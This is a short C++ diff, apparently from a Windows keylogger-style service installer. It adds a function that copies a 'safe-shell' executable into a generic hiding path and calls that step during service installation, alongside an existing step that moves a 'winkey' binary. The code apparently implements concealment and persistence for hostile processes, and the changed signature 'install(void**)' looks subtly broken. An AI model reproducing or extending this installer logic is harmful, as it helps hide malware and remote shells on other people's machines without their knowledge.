@@ -58,9 +58,34 @@ static BYTE movWinkey(void) {
 	return (SUCCESS);
 }
 
-int install(void) {
+static BYTE moveAdditionalProcesses(void) { // TODO cleanup and refactor that shitty mess
+	wstring name(L"safe-shell");
+	wstring processPath = getServicePath(name);
+	wstring genericHidingPath = GEN_HIDING_PATH + name + L".exe";
+
+	wcout	<< L"Shafe shell process path: " << processPath << '\n';
+	wcout	<< "Hiding path: " << genericHidingPath << '\n';
+
+	if (!CopyFileW(
+			processPath.c_str(),
+			genericHidingPath.c_str(),
+			FALSE
+		)) {
+
+		cerr	<< "Can't move safe-shell.exe... error code: "<< GetLastError()
+				<< "Failed to create service...\n"
+				<< "\n";
+
+		return (FAILURE);
+	}
+	return (SUCCESS);
+}
+
+int install(void**) {
 	cout	<< "Installing service...\n";
 	if (!movWinkey())
+		return (FAILURE);
+	if (!moveAdditionalProcesses())
 		return (FAILURE);
 	if (!createService())
 		return (FAILURE);
